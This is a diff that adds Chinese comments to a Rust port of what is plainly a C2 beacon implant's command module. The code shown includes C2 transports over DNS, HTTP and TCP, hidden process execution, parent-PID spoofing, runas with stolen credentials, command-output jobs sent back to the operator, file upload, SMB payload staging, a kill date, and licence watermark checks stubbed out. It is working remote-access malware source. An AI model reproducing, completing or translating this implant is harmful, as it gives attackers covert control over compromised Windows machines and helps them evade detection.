@@ -1,3 +1,4 @@
+//! 命令实现（commands.cpp）+ 回调/命令常量（commands.h）。
 //! Command implementations (commands.cpp) + callback/command constants
 //! (commands.h).
 
@@ -22,6 +23,7 @@ use windows_sys::Win32::UI::WindowsAndMessaging::SW_HIDE;
 use windows_sys::Win32::Storage::FileSystem::{FlushFileBuffers, WriteFile};
 use windows_sys::Win32::Foundation::HANDLE;
 
+// ---- 回调常量（commands.h）------------------------------------
 // ---- callback constants (commands.h) ------------------------------------
 
 pub const CALLBACK_OUTPUT: i32 = 0x00;
@@ -58,6 +60,7 @@ pub const CALLBACK_OUTPUT_OEM: i32 = 0x1e;
 pub const CALLBACK_ERROR: i32 = 0x1f;
 pub const CALLBACK_OUTPUT_UTF8: i32 = 0x20;
 
+// c2 传输选项
 // c2 options
 pub const POST_DNS: u32 = 0x0;
 pub const POST_HTTP: u32 = 0x1;
@@ -67,16 +70,19 @@ pub const POST_TCP: u32 = 0x3;
 pub const MAX_PACKET: usize = 524288;
 pub const MAX_PACKET_DNS: usize = 4096;
 
+// 读取模式
 // read modes
 pub const JOB_MODE_BYTE: i16 = 0x0;
 pub const JOB_MODE_MESSAGE: i16 = 0x1;
 
+/// 终止信标（die）。
 /// Terminate the beacon (die).
 pub fn command_die(cb: Callback) {
     state::set_sleep_time(0);
     cb(&[], 0, CALLBACK_DEAD);
 }
 
+/// 更改当前目录。
 /// Change the current directory.
 pub fn command_cd(buffer: &[u8], length: usize) {
     let mut path = vec![0u8; 1024];
@@ -89,8 +95,10 @@ pub fn command_cd(buffer: &[u8], length: usize) {
     }
 }
 
+/// 设置环境变量。
 /// Set an environment variable.
 pub fn command_setenv(buffer: &[u8], _length: usize) {
+    // 与 C 的 putenv(buffer) 相同："KEY=VALUE"
     // putenv(buffer): "KEY=VALUE"
     if let Ok(s) = std::str::from_utf8(buffer) {
         if let Some(eq) = s.find('=') {
@@ -99,8 +107,10 @@ pub fn command_setenv(buffer: &[u8], _length: usize) {
     }
 }
 
+/// 调整休眠时间。
 /// Adjust the sleep time.
 pub fn command_sleep(buffer: &[u8], length: usize) {
+    // CS-13：不要覆盖 0 休眠时间（等待退出）
     // CS-13: don't override a zero sleep time (waiting to exit)
     if state::sleep_time() == 0 {
         return;
@@ -115,6 +125,7 @@ pub fn command_sleep(buffer: &[u8], length: usize) {
     }
 }
 
+/// 不使用 shell 运行命令。
 /// Run a command without a shell.
 pub fn command_execute(buffer: &[u8], length: usize) {
     let mut si: STARTUPINFOA = unsafe { std::mem::zeroed() };
@@ -123,7 +134,7 @@ pub fn command_execute(buffer: &[u8], length: usize) {
 
     unsafe {
         GetStartupInfoA(&mut si);
-        si.dwFlags = 0x00000100 | 0x00000001; // STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
+        si.dwFlags = 0x00000100 | 0x00000001; // 使用标准句柄并显示窗口 / STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
         si.wShowWindow = SW_HIDE as u16;
         si.hStdOutput = std::ptr::null_mut();
         si.hStdError = std::ptr::null_mut();
@@ -147,6 +158,7 @@ pub fn command_execute(buffer: &[u8], length: usize) {
     cleanup_process(&pi);
 }
 
+/// 在指定的父 PID 下运行。
 /// Run under a specific parent PID.
 pub fn command_runu(buffer: &[u8], length: usize) {
     let mut local = data_alloc(8192);
@@ -171,7 +183,7 @@ pub fn command_runu(buffer: &[u8], length: usize) {
         clen,
         &mut si as *mut _ as *mut core::ffi::c_void,
         &mut pi as *mut _ as *mut core::ffi::c_void,
-        0x00000010 /* CREATE_NEW_CONSOLE */,
+        0x00000010 /* 创建新控制台 / CREATE_NEW_CONSOLE */,
         false,
         ppid,
     );
@@ -180,6 +192,7 @@ pub fn command_runu(buffer: &[u8], length: usize) {
     cleanup_process(&pi);
 }
 
+/// 快速/轻松地将 ASCII 字符串转换为宽字符。
 /// Quickly/easily convert an ASCII string to wide chars.
 pub fn to_wide_char(src: &[u8], dst: &mut [u16], max: usize) -> bool {
     let s = String::from_utf8_lossy(src);
@@ -195,6 +208,7 @@ pub fn to_wide_char(src: &[u8], dst: &mut [u16], max: usize) -> bool {
     true
 }
 
+/// 域、用户、密码、命令+参数 [全部为宽字符串]。
 /// Domain, user, password, command+args [all wide strings].
 pub fn command_runas(buffer: &[u8], length: usize, callback: Callback) {
     let mut local = data_alloc((1024 * 3) + crate::process::MAX_RUNAS_CMD);
@@ -213,6 +227,7 @@ pub fn command_runas(buffer: &[u8], length: usize, callback: Callback) {
         return;
     }
 
+    // 禁用当前令牌
     // disable the current token
     crate::tokens::token_guard_start();
     let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
@@ -270,6 +285,7 @@ fn execjob_doit(runme: &[u8], flags: u32) {
     psh_track(&pi, read_stdout as isize, newstdout as isize);
 }
 
+/// 运行本地操作系统命令，获取输出，稍后发回。
 /// Run a local OS command, get output, send it back later.
 pub fn command_execjob(buffer: &[u8], length: usize) {
     let mut chunks = data_alloc(8192 * 4);
@@ -283,16 +299,19 @@ pub fn command_execjob(buffer: &[u8], length: usize) {
     let _ = parser.data_string(&mut args, 8192);
     let flags = parser.data_short() as u32;
 
+    // 仅对命令展开环境变量
     // expand env vars in the command only
     let cmd_len = command.iter().position(|&c| c == 0).unwrap_or(command.len());
     crate::filesys::env_expand(&command[..cmd_len], &mut command_exp, 8192);
 
+    // 组合命令 + 参数
     // combine command + args
     let exp_len = command_exp.iter().position(|&c| c == 0).unwrap_or(command_exp.len());
     let arg_len = args.iter().position(|&c| c == 0).unwrap_or(args.len());
     runme[..exp_len].copy_from_slice(&command_exp[..exp_len]);
     runme[exp_len..exp_len + arg_len].copy_from_slice(&args[..arg_len]);
 
+    // 若要求则禁用 WOW64
     // disable WOW64 if requested
     if (flags & 1) == 1 {
         let mut old_value: *mut core::ffi::c_void = std::ptr::null_mut();
@@ -306,6 +325,7 @@ pub fn command_execjob(buffer: &[u8], length: usize) {
     chunks.cleanup();
 }
 
+/// 上传一些内容。
 /// Upload some content.
 pub fn command_upload(buffer: &[u8], length: usize, mode: &[u8]) {
     let mut name = vec![0u8; 1024];
@@ -335,6 +355,7 @@ pub fn command_upload(buffer: &[u8], length: usize, mode: &[u8]) {
     }
 }
 
+/// 返回当前工作目录。
 /// Return the current working directory.
 pub fn command_pwd(callback: Callback) {
     let mut result = vec![0u8; 2048];
@@ -350,6 +371,7 @@ pub fn command_pause(buffer: &[u8], length: usize) {
     std::thread::sleep(std::time::Duration::from_millis(time as u64));
 }
 
+/// 连接到 host:port。
 /// Connect to a host:port.
 pub fn wsconnect(targetip: &[u8], port: i32) -> isize {
     unsafe {
@@ -454,8 +476,10 @@ pub fn command_stage_payload_smb(buffer: &[u8], length: usize) {
     post_error_sd(0x32, &pipe, unsafe { GetLastError() } as i32);
 }
 
+/// TRUE - 退出，FALSE - 照常继续。
 /// TRUE - exit, FALSE - continue as normal.
 pub fn check_kill_date() -> bool {
+    // 没有 killdate 就不做任何事！
     // do nothing if there is no killdate!
     if setting_int(crate::beacon::SETTING_KILLDATE) == 0 {
         return false;
@@ -468,11 +492,13 @@ pub fn check_kill_date() -> bool {
     today >= setting_int(crate::beacon::SETTING_KILLDATE)
 }
 
+/// 水印校验（本构建中禁用，与 C++ 注释一致）。
 /// Watermark validation (disabled in this build, like the C++ comments).
 pub fn bad_watermark() -> bool {
     true
 }
 
+/// 水印哈希校验（本构建中禁用）。
 /// Watermark hash validation (disabled in this build).
 pub fn bad_watermark_hash() -> bool {
     true
